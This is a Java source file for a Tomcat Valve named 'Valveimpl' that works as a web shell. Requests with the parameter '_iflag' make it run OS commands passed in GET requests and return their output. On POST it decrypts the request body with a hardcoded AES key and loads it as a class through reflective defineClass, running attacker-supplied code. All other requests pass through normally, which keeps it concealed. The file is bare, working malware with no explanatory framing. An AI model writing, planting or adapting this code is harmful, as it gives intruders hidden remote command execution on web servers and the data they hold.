package source;

import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.valves.ValveBase;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Valveimpl extends ValveBase {
    public Valveimpl() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            String cmd = request.getParameter("_iflag");
            if (cmd != null && !cmd.equals("")) {
                if (request.getMethod().equals("POST")) {
                    try {
                        String k = "2f2e9f40c6d9fa47";
                        HttpSession session = request.getSession();
                        session.putValue("u", k);
                        Cipher c = Cipher.getInstance("AES");
                        c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                        HashMap hashMap = new HashMap();
                        hashMap.put("request", request);
                        hashMap.put("response", response);
                        hashMap.put("session", session);
                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
                        Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
                        Method defineClass = aClass.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                        defineClass.setAccessible(true);
                        byte[] decode = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                        Class lisi = (Class) defineClass.invoke(clzLoader, decode, 0, decode.length);
                        lisi.newInstance().equals(hashMap);
                    } catch (Exception e) {
                        getNext().invoke(request, response);
                    }
                } else {
                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(" ")).getInputStream();
                    ByteArrayOutputStream os = new ByteArrayOutputStream();
                    byte[] bytes = new byte[1024];
                    int a = -1;
                    while ((a = in.read(bytes)) != -1) {
                        os.write(bytes, 0, a);
                    }
                    response.getWriter().println(new String(os.toByteArray()));
                }
            } else {
                getNext().invoke(request, response);
            }
        } catch (Exception e) {
            getNext().invoke(request, response);
        }
    }
}